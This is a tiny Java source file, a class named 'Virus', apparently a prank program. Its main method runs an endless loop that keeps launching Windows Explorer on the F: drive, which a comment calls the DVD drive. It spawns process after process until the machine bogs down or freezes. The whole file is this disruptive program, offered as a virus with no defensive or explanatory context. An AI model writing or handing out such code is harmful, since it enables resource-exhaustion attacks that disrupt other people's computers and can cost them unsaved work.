import java.awt.Desktop;
import java.io.*;

public class Virus {
    public static void main(String[] args) {
        try {
            while (true)
                Runtime.getRuntime().exec("explorer F:\\"); //path of your DVD drive
            
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
